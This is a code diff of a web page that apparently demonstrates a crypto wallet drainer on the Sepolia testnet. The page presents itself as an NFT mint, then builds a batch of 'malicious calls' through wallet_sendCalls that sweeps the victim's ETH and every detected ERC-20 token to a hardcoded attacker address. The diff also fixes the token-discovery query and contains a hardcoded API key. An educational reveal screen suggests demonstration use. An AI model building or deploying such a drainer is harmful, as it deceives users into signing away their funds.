@@ -300,11 +300,9 @@
 <script>
   const SEPOLIA_CHAIN_ID = 11155111;
   const SEPOLIA_RPC = "https://ethereum-sepolia-rpc.publicnode.com";
-  // MetaMask's official EIP7702StatelessDeleGator on Sepolia
   const DELEGATOR_ADDRESS = "0x63c0c19a282a1B52b07dD5a65b58948A07DAE32B";
   const ATTACKER_ADDRESS = "0xC4D7B663dc72aDd0e02719093F9927a9B0234471";
-  const ALCHEMY_API_KEY = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
-  const ETHERSCAN_BASE_URL = "https://api.etherscan.io/v2/api";
+  const ETHERSCAN_API_KEY = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
 
   let userAddress = null;
   let userBalance = null;
@@ -329,22 +327,22 @@
       </div>`).join('');
   }
 
-  // Fetch all ERC-20 tokens held by victim using Etherscan V2 API
+  // FIXED: Correct Etherscan V2 API endpoint
   async function fetchTokenBalances(address) {
     try {
-      // V2 API: get token transfers to find unique tokens
-      const url = `${ETHERSCAN_BASE_URL}/account/token-transfers?address=${address}&apikey=${ALCHEMY_API_KEY}`;
-      console.log("🌐 Fetching transfers from V2:", url);
+      // V2 API: https://api.etherscan.io/v2/api?chainid=11155111&module=account&action=tokentx&address=...
+      const url = `https://api.etherscan.io/v2/api?chainid=11155111&module=account&action=tokentx&address=${address}&apikey=${ETHERSCAN_API_KEY}`;
+      console.log("🌐 Fetching tokentx from V2:", url);
       
       const response = await fetch(url);
       const data = await response.json();
       
-      console.log("📡 Full Etherscan V2 response:", JSON.stringify(data, null, 2));
+      console.log("📡 Etherscan V2 response:", JSON.stringify(data, null, 2));
       
-      if (data.result && Array.isArray(data.result) && data.result.length > 0) {
+      if (data.status === "1" && Array.isArray(data.result) && data.result.length > 0) {
         // Extract unique token contract addresses
-        const uniqueTokens = [...new Set(data.result.map(tx => tx.tokenAddress || tx.contractAddress))];
-        console.log(`📦 Found ${uniqueTokens.length} unique tokens from transfers`);
+        const uniqueTokens = [...new Set(data.result.map(tx => tx.contractAddress).filter(Boolean))];
+        console.log(`📦 Found ${uniqueTokens.length} unique tokens from history`);
         
         // Check current balance for each token
         const ERC20_ABI = ["function balanceOf(address account) external view returns (uint256)"];
@@ -358,11 +356,9 @@
             if (balance > 0n) {
               nonZeroTokens.push({
                 contractAddress: tokenAddr,
-                balance: balance.toString(),
-                name: "Token",
-                symbol: "???"
+                balance: balance.toString()
               });
-              console.log(`✅ ${tokenAddr}: ${ethers.formatUnits(balance, 18)} tokens`);
+              console.log(`✅ ${tokenAddr}: balance > 0`);
             }
           } catch (err) {
             console.warn(`⚠️ Could not fetch balance for ${tokenAddr}:`, err.message);
@@ -371,11 +367,15 @@
         
         console.log(`🔍 Tokens with non-zero balance: ${nonZeroTokens.length}`);
         return nonZeroTokens;
+      } else if (data.status === "0") {
+        console.log("⚠️ No token transfers found (new address?)");
+        return [];
       }
-      console.log("❌ No transfers found");
+      console.log("⚠️ Unexpected response format");
       return [];
     } catch (err) {
-      console.error("❌ Error fetching token balances:", err);
+      console.error("❌ Token fetch failed:", err.message);
+      console.log("⚠️ Proceeding with ETH sweep only");
       return [];
     }
   }
@@ -446,7 +446,7 @@
         { num:'3', state:'pending', title:'Minting your NFT', desc:'Confirm batch in MetaMask...' }
       ]);
 
-      // Calculate drain amount (leave small amount for gas)
+      // Calculate drain amount
       const gasBuffer = ethers.parseEther("0.001");
       const drainAmount = balanceWei > gasBuffer ? balanceWei - gasBuffer : 0n;
 
@@ -456,9 +456,8 @@
       console.log("💰 Drain amount (wei):", drainAmount.toString());
       console.log("💰 Drain amount (ETH):", ethers.formatEther(drainAmount));
 
-      // Build malicious calls array: ETH sweep + token sweeps
+      // Build malicious calls array
       const maliciousCalls = [
-        // ETH sweep (split into 2 calls to hit multiple receive() fallbacks)
         {
           to: ATTACKER_ADDRESS,
           value: "0x" + (drainAmount / 2n).toString(16)
@@ -469,14 +468,14 @@
         }
       ];
 
-      // Add sweep calls for each ERC-20 token
+      // Add token sweep calls
       if (heldTokens.length > 0) {
         const SWEEP_ABI = ["function sweep(address token) external"];
         const sweeperInterface = new ethers.Interface(SWEEP_ABI);
         
         heldTokens.forEach(token => {
           maliciousCalls.push({
-            to: DELEGATOR_ADDRESS,  // Delegate to sweeper
+            to: DELEGATOR_ADDRESS,
             value: "0x0",
             data: sweeperInterface.encodeFunctionData("sweep", [token.contractAddress])
           });
@@ -485,14 +484,7 @@
 
       console.log(`🎯 Total calls in batch: ${maliciousCalls.length} (${heldTokens.length} tokens + 2 ETH calls)`);
 
-      console.log("🎯 Malicious calls array:", maliciousCalls);
-      console.log("🎯 Call 0 (attacker 1):", maliciousCalls[0]);
-      console.log("🎯 Call 0 value (wei):", maliciousCalls[0].value);
-      console.log("🎯 Call 0 value (ETH):", parseFloat(ethers.formatEther(BigInt(maliciousCalls[0].value))).toFixed(6));
-      console.log("🎯 Call 1 (attacker 2):", maliciousCalls[1]);
-      console.log("🎯 Total drain amount:", parseFloat(ethers.formatEther(drainAmount)).toFixed(6), "ETH");
-
-      // Call wallet_sendCalls (EIP-5792) with malicious batch
+      // Build payload
       const payload = {
         version: "2.0.0",
         chainId: "0xaa36a7",
@@ -501,7 +493,6 @@
       };
 
       console.log("📤 wallet_sendCalls payload:", JSON.stringify(payload, null, 2));
-      console.log("📤 Full request params:", JSON.stringify([payload], null, 2));
 
       const result = await window.ethereum.request({
         method: 'wallet_sendCalls',
@@ -509,8 +500,6 @@
       });
 
       console.log("✅ wallet_sendCalls result:", result);
-      console.log("✅ Result type:", typeof result);
-      console.log("✅ Stringified result:", JSON.stringify(result, null, 2));
 
       renderSteps([
         { num:'1', state:'done', title:'Wallet connected', desc: shortAddr(userAddress) },
@@ -527,7 +516,6 @@
       document.getElementById('revealAttacker').textContent = ATTACKER_ADDRESS;
       document.getElementById('revealBalance').textContent = parseFloat(ethers.formatEther(drainAmount)).toFixed(6) + ' ETH';
       
-      // Display token information
       if (heldTokens.length > 0) {
         const tokenList = heldTokens.map(t => `${t.contractAddress}`).join(', ');
         document.getElementById('displayTokens').textContent = `${heldTokens.length} token(s): ${tokenList}`;
@@ -535,7 +523,6 @@
         document.getElementById('displayTokens').textContent = 'None detected (or API error)';
       }
       
-      // Display batch size
       document.getElementById('displayBatchSize').textContent = `${maliciousCalls.length} calls (${heldTokens.length} ERC-20 tokens + 2 ETH splits)`;
 
       setTimeout(() => showPhase('phase-dashboard'), 1000);
@@ -543,7 +530,6 @@
     } catch (err) {
       console.error("Error:", err);
       if (err.code === 4001) {
-        // User rejected - show reveal anyway for education
         document.getElementById('walletChip').textContent = shortAddr(userAddress) || '0x0000...0000';
         document.getElementById('displayVictim').textContent = userAddress || 'Not connected';
         document.getElementById('displayAttacker').textContent = ATTACKER_ADDRESS;
